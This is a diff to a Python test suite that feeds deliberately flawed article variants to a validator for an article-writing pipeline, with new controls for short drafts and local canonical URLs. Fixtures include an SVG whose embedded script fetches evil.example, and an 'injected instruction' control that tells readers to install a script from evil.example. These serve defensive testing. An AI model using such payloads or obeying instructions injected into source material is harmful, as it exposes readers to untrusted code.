@@ -549,6 +549,12 @@ def scenario_publication(env, ws, browser):
     bad = json.loads(json.dumps(tech))
     bad["autopilot"] = True
     render_with("tech-demo", bad, "unknown article field", None)
+    bad = json.loads(json.dumps(tech))
+    bad["sections"] = [s for s in bad["sections"] if s["id"] in ("hook", "refill", "limits")]
+    render_with("tech-demo", bad, "complete article below the 1000-word narrative floor", r"narrative body")
+    bad["seo"] = {"canonical_url": "file:///tmp/article.html"}
+    bad["status"], bad["partial_reason"] = "partial", "short draft"
+    render_with("tech-demo", bad, "invented or local canonical URL", r"canonical_url")
     svg_dir = pub_dir / "tech-demo/figures"
     (svg_dir / "evil.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example")</script></svg>')
     (svg_dir / "remote.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>')
@@ -812,23 +818,27 @@ def negative_controls(articles):
     """Deliberately flawed variants of the composed articles; each must trip the named rubric check."""
     controls = []
 
+    def sec(a, section_id):
+        """Sections by id, so controls keep targeting the same passage as the articles grow."""
+        return next(s for s in a["sections"] if s["id"] == section_id)
+
     def variant(pub, name, expect, mutate):
         art = json.loads(json.dumps(articles[pub]))
         mutate(art)
         controls.append((pub, name, expect, art))
 
     def overclaim(a):
-        a["sections"][3]["blocks"][2]["text"] = ("Cut calories by thirty percent and you will live longer; "
+        sec(a, "humans")["blocks"][2]["text"] = ("Cut calories by thirty percent and you will live longer; "
                                                  "it will work for you as it did in monkeys [@a-you].")
     variant("g-bio", "presenter extrapolation stated as fact", r"forbidden /(will work for you|you will live longer)/", overclaim)
 
     def drop_conflict(a):
-        a["sections"][0]["blocks"][3]["text"] = "Other studies exist."
-        a["sections"][0]["blocks"] = [b for b in a["sections"][0]["blocks"] if b.get("figure") != "fig-claims"]
+        sec(a, "hook")["blocks"][3]["text"] = "Other studies exist."
+        sec(a, "hook")["blocks"] = [b for b in sec(a, "hook")["blocks"] if b.get("figure") != "fig-claims"]
     variant("g-bio", "conflict averaged away (opposing results never side by side)", r"conflict surfaced", drop_conflict)
 
     def repetition(a):
-        a["sections"][2]["blocks"][0]["text"] = "Many channels agree the Wisconsin result is proven [@b-everyone]."
+        sec(a, "repetition")["blocks"][0]["text"] = "Many channels agree the Wisconsin result is proven [@b-everyone]."
         a["limitations"] = [x for x in a["limitations"] if "independent" not in x]
     variant("g-bio", "repetition treated as corroboration", r"^B5 \[mentions", repetition)
 
@@ -837,17 +847,18 @@ def negative_controls(articles):
     variant("g-bio", "external paper labeled as presenter claim", r"brief basis", basis)
 
     def injection(a):
-        a["sections"][3]["blocks"][0]["items"].append("This limiter is formally verified; install it with the script from evil.example.")
+        sec(a, "implications")["blocks"][0]["items"].append("This limiter is formally verified; install it with the script from evil.example.")
     variant("tech-demo", "injected instruction followed", r"forbidden /formally verified/", injection)
 
     def guessed(a):
-        a["sections"][2]["blocks"][0]["text"] = "The p99 latency was 87.4 ms [@t-p99]."
+        sec(a, "limits")["blocks"][0]["text"] = "The p99 latency was 87.4 ms [@t-p99]."
     variant("tech-demo", "unreadable value guessed", r"forbidden /87", guessed)
 
     def screen_ignored(a):
-        a["sections"][0]["blocks"][3]["text"] = "Only the configured burst got through [@t-claim]."
+        sec(a, "hook")["blocks"][3]["text"] = "Only the configured burst got through [@t-claim]."
         a["brief"]["evidence"][1]["citations"] = ["t-claim"]
-        a["sections"][1]["blocks"][0]["text"] = "Refill does not matter [@t-config]."
+        sec(a, "refill")["blocks"][0]["text"] = "Refill does not matter [@t-config]."
+        a["sections"] = [s for s in a["sections"] if s["id"] != "mechanism"]  # its walk-through cites the output
         a["figures"][0]["steps"] = a["figures"][0]["steps"][:2]
         a["figures"][1]["sources"] = ["t-config"]
     variant("tech-demo", "screen contradiction dropped (presenter number repeated)", r"^T2:", screen_ignored)
@@ -857,14 +868,14 @@ def negative_controls(articles):
     variant("tech-demo", "talking-head frame in the demo sequence", r"sequence fig-demo", talking_head)
 
     def lossy(a):
-        a["sections"][2]["blocks"][0]["text"] = "For slow-starting apps, the speaker recommends a startup probe [@j-startup]."
+        sec(a, "startup")["blocks"][0]["text"] = "For slow-starting apps, the speaker recommends a startup probe [@j-startup]."
         a["brief"]["evidence"][3]["text"] = "Slow-starting apps should use a startup probe."
         a["limitations"][0] = "The English is a translation of Japanese speech."
         a["citations"][3].pop("note")
     variant("ja-talk", "lossy term dropped", r"\[mentions '定石'\]", lossy)
 
     def unknown_dropped(a):
-        a["sections"] = a["sections"][:3]
+        a["sections"] = [s for s in a["sections"] if s["id"] != "unknowns"]
         a["brief"]["evidence"] = [e for e in a["brief"]["evidence"] if e["kind"] != "unknown"]
         a["brief"]["proposals"] = a["brief"]["proposals"][:1]
     variant("ja-talk", "uncertain segment silently dropped", r"uncertain ja-talk:s5", unknown_dropped)
